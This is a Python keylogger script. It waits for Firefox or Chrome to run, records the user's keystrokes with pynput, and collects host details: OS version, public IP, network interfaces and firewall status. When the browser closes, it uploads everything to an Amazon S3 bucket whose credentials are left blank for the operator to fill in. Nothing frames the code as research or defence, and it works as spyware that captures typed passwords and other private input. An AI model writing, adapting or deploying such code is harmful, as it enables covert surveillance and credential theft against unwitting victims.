import subprocess
import sys
import psutil

def install_dependencies():
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'boto3', 'psutil'])
    except subprocess.CalledProcessError as e:
        print("Error installing dependencies:", e)
        sys.exit(1)

#Install dependencies
install_dependencies()

import boto3
from botocore.exceptions import NoCredentialsError
from pynput import keyboard
import time
import os
import uuid
import platform
import socket
import subprocess
import tempfile
import urllib.request

#AWS S3 configurations
aws_access_key_id = ""
aws_secret_access_key = ""
s3_bucket_name = ""

#Function to upload file to S3 bucket
def upload_to_s3(file_content, bucket, object_name):
    s3_client = boto3.client('s3', aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)
    try:
        response = s3_client.put_object(Body=file_content, Bucket=bucket, Key=object_name)
    except NoCredentialsError:
        print("AWS credentials not available or invalid.")
    except Exception as e:
        print("An error occurred while uploading to S3 bucket.")
        print(e)

#Function to process keystrokes and add to buffer
def on_press(key):
    global keystrokes_buffer
    global keystrokes_word
    try:
        key_char = key.char if hasattr(key, 'char') else str(key)
        if key_char == ' ':  #If space is pressed, append the word to the buffer
            keystrokes_buffer += '\n' if keystrokes_buffer else ''  #Add a newline if it's the start of a new word
            keystrokes_buffer += keystrokes_word
            keystrokes_word = ""  #Reset the word buffer
        elif len(key_char) == 1:  #Check if key_char is a single character
            keystrokes_word += key_char
    except Exception as e:
        print("Error: Unable to process keystroke.")
        print(e)

#Function to check if firefox is running
def is_firefox_running():
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] in ['firefox', 'firefox.exe', 'Firefox']:
            return True
    return False

#Function to check if chrome is running
def is_chrome_running():
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] in ['chrome', 'chrome.exe', 'Google Chrome']:
            return True
    return False

#Function to gather network information
def get_network_info():
    try:
        interfaces = psutil.net_if_addrs()
        return interfaces
    except Exception as e:
        print("Error retrieving network information:", e)
        return None

#Function to get windows version
def get_windows_version():
    return platform.platform()

#Function to get public IP address
def get_public_ip():
    try:
        url = 'https://api.ipify.org'
        with urllib.request.urlopen(url) as response:
            public_ip = response.read().decode('utf-8')
        return public_ip
    except Exception as e:
        print("Error retrieving public IP address:", e)
        return None

#Function to check firewall status
def get_firewall_status():
    try:
        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'], capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        print("Error retrieving firewall status:", e)
        return None

#Buffer to store keystrokes and the current word
keystrokes_buffer = ""
keystrokes_word = ""

#Start listening for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    #Wait for Firefox or Chrome to be opened
    while not (is_firefox_running() or is_chrome_running()):
        time.sleep(5)
        
    #Monitor firefox or chrome continuously
    while True:
        if not (is_firefox_running() or is_chrome_running()):
            listener.stop()
            #Append the last accumulated word to the buffer if not empty
            if keystrokes_word:
                keystrokes_buffer += '\n' if keystrokes_buffer else ''  #Add a newline if it's the start of a new word
                keystrokes_buffer += keystrokes_word

            #Gather computer information
            computer_info = f"\nWindows Version: {get_windows_version()}\n"
            computer_info += f"Public IP Address: {get_public_ip()}\n"
            computer_info += "Network Information:\n"
            network_info = get_network_info()
            if network_info:
                for iface, ipv4_address in network_info.items():
                    computer_info += f"  Interface: {iface}, IPv4 Address: {ipv4_address}\n"
            else:
                computer_info += "Error retrieving network information.\n"
            
            computer_info += "Firewall Status:\n"
            computer_info += f"{get_firewall_status()}\n"

            #Upload keystrokes log and computer information to S3
            upload_to_s3(keystrokes_buffer + computer_info, s3_bucket_name, "keystrokes_" + str(uuid.uuid4()) + ".log")
            break

        time.sleep(5)